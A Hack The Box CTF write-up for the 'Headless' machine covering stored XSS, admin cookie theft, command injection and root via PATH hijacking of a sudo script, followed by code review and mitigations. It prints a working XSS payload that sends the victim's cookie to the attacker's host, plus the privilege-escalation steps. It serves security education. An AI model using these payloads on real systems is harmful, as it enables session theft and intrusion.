--- 
title: "Hack the Box (HTB) - Headless"
description: "Stored XSS, Cookie Theft, & Path Injection"
date: 2024-08-13 12:00:00 -100
image: /assets/images/HTB - Headless/Headless HTB.jpg
categories: [CTF]
tags: [xss, cookie manipulation, command injection, path injection ]    # TAG names should always be lowercase
---

## Enumeration

Let's run our [AutoRecon](https://github.com/Tib3rius/AutoRecon) scan against our target at `10.10.11.8`

We see the following ports open:

- TCP 22 (SSH openSSH 9.2p1 Debian)
- TCP 5000 (upnp?)
- UDP (None)

Let's check out the service running on port 5000

![Port 5000](/assets/images/HTB%20-%20Headless/Port%205000.png)

Clicking on `For Questions` we see the following:

![Support](/assets/images/HTB%20-%20Headless/Contact%20support.png)

We see some input fields here, let's enter some information adn check the request in burp

![Hacking Attempt](/assets/images/HTB%20-%20Headless/Hacking%20Atempt.png)

We see that our XSS attempt on the message parameter gets rejected. We see this `Hacking Attempt Dectected` screen.

Let's try injecting in the user-agent header

```html
User-Agent: <script>alert(1)</script>
```

![Reflected XSS](/assets/images/HTB%20-%20Headless/Reflectd%20XSs.png)

So the User-Agent header is vulnerable to XSS

Judging by the message `has been sent to the administrators for investigation` & the fact that we confirmed XSS on the user-agent header. We may be able to try a stored XSS attacker on the user-agent header, and trigger the alert in hopes to steal the admins cookie

```javascript
<script>var i=new Image(); i.src="http://10.10.14.41:5000/?cookie="+btoa(document.cookie);
</script
```

This snippet of JavaScript will effectively send the user's cookie to our python web sever by embedding them in the URL of a newly created image object

![Cookie Script](/assets/images/HTB%20-%20Headless/Cookie%20Script.png)

![Cookie](/assets/images/HTB%20-%20Headless/Cookie.png)

The string ``aXNfYWRtaW49SW5WelpYSWkudUFsbVhsVHZtOHZ5aWhqTmFQRFdudkJfWmZz` is a Base64-encoded version of the cookie that was stolen by our XSS payload

Let's decode the cookie

```bash
echo "aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=" | base64 -d
```

We get `is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 `

Obviously we need some sort of login to utilize this cookie. Let's run a quick gobuster scan

```bash
 gobuster dir -u http://10.10.11.8:5000 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
```

We see the following directories:

- /support              (Status: 200) [Size: 2363]
- /dashboard            (Status: 500) [Size: 265]

Let's visit /dashboard

![Unauthorized](/assets/images/HTB%20-%20Headless/Unauthorized.png)

We get this unauthorized response, ( as indicated by the 500 http response during our gobuster scan) but since we now have the admin cookie `ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0` we can simply edit our cookie in the developer tools and reload the page

![Admin Dashboard](/assets/images/HTB%20-%20Headless/Admin%20Dashboard.png)

We arrive at the admin dashboard at last! Let's hit this `Generate Report` button and check out the request in burp

![Command Injection](/assets/images/HTB%20-%20Headless/Comamnd%20Injection.png)

It looks like this admin dashboard is vulnerable to command injection. This tends to happen because security is usually stronger on the outside of anything rather than the inside. But anyway, I digress, let's get a revere shell going an take a look around

## Privilege Escalation

As always let's check a few things

| **Category**                      | **Command**                                      | **Result**                                       |
|-----------------------------------|--------------------------------------------------|--------------------------------------------------|
| **Current User & Group Perms (ID)** | `id`                                            | uid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users) |
| **Kernel Version**                | `uname -r`                                      | 6.1.0-18-amd64|
| **SUDO Permissions**              | `sudo -l`                                       | (ALL) NOPASSWD: /usr/bin/syscheck|
| **SUID Binaries**            | `find / -perm 4000 2>/dev/null`                  | Nothing                                      |
| **Services Running as Root**      | `netstat -antup`      | Nothing noteworthy                           |
| **Cron Jobs**                     | `ls -la /etc/cron.d`<br>`find / -perm -2 -type f 2>/dev/null` | Nothing noteworthy                           |
| **PATH**                          | `echo $PATH`                                    | /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

We'll go for the low hanging fruit first and check out this SUDO permission which lets us run `/usr/bin/syscheck` 

```bash
cat /usr/bin/syscheck
```

![SUDO Script](/assets/images/HTB%20-%20Headless/init.db.sh.png)

This script ensures it's run by root, then reports the last kernel modification time, available disk space, and system load average. It checks if a process named `init.db.sh` is running, and if not runs it

We might be able to exploit the syscheck script's use of a relative path to execute initdb.sh and gain root access. The script runs as root, so if we create a fake file named initdb.sh with malicious content and place it in a directory that appears earlier in the system's $PATH than the actual initdb.sh, the script will execute our fake version. This allows us to leverage the script's behavior to gain root privileges

First we will change to our home directory

```bash
cd 
```

Now let's create our malicious file with the same name the script is calling

```bash
nano initdb.sh
```

Edit the bash script to spawn a shell

```bash
#!/bin/bash
/bin/bash
```

Make the file executable

```bash
chmod +x initdb.sh
```

Add our home directory to the $PATH

```BASH
export PATH="$HOME:$PATH"
```

Finally, execute the syscheck script

```bash
sudo /usr/bin/syscheck
```

![Root](/assets/images/HTB%20-%20Headless/Root%20Headless.png)

GG, we've rooted Headless!


## Locating the XSS Vulnerabilities

Okay, so this box had an XSS vulnerability & a command injection vulnerablility. Let's showcase that a little bit

![XSS Vuln](/assets/images/HTB%20-%20Headless/Vulnerble%20Code.png)

The request_info dictionary, which contains the request details (including headers), is passed directly into the format_request_info function to be converted into an HTML string

Contrary to the `if ("<" in message and ">" in message) or ("{{" in message and "}}" in message)` code above it that only checks for these characters in the message section

The `formatted_request_info = format_request_info(request_info)
html = render_template('hackattempt.html', request_info=formatted_request_info)` will render the information a HTML, including the headers (this is how we capture the admin cookie who views the hackattempt message)

The user-agent field could have been sanitized using the escape() function on the headers, method, and URL to prevent this attack. The escape() function in flask converts the special characters i na string to their corresponding HTML entities

The output would look something like this 

```python
# Safe Script
from flask import escape

safe_input = escape(user_input)
print(safe_input)

# Output 
&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
```

Now let's find the command injection vulnerability discoverd in the admin pannel

![Comamnd Injection](/assets/images/HTB%20-%20Headless/Command%20Injection.png)

This form submits a `POST` reuqest with the data parameter to the dashboard endpoint. The data parameter is directly used in the os.popen call in the admin() function leading to command injection if an attacker uses malicious input.

The server has no validation on this HTML input. The admin here is simply trusting the input provided directly through the HTML forum because it's the admin panel and not meant for any regular joe. But as we've demonstrated with every CTF you must enforce a zero trust policy to maintain good security.

The admin should take the collect the input via HTML and valide with serve-side python scripts (flask since that's what this app was)


| **Vulnerability**                                | **Mitigation**                                                                                     |
|--------------------------------------------------|----------------------------------------------------------------------------------------------------|
| **XSS (Cross-Site Scripting)**                  | Sanitize and validate all user inputs to prevent script injection. Implement Content Security Policy (CSP). |
| **Cookie Manipulation**                         | Use secure flags (`Secure`, `HttpOnly`, `SameSite`) for cookies. Validate and sanitize cookie data. |
| **Command Injection**                           | Sanitize and validate all user inputs. Avoid executing shell commands with user-supplied data. Use parameterized commands when possible. |
| **Path Injection**                              | Use absolute paths for file references. Validate and sanitize environment variables and inputs used in path construction. |

### Remediation References

- [OWASP XSS (Cross-Site Scripting) Prevention Cheat Sheet](https://owasp.org/www-community/xss-prevention)
- [OWASP Cookie Security](https://owasp.org/www-community/controls/Cookie_Security)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

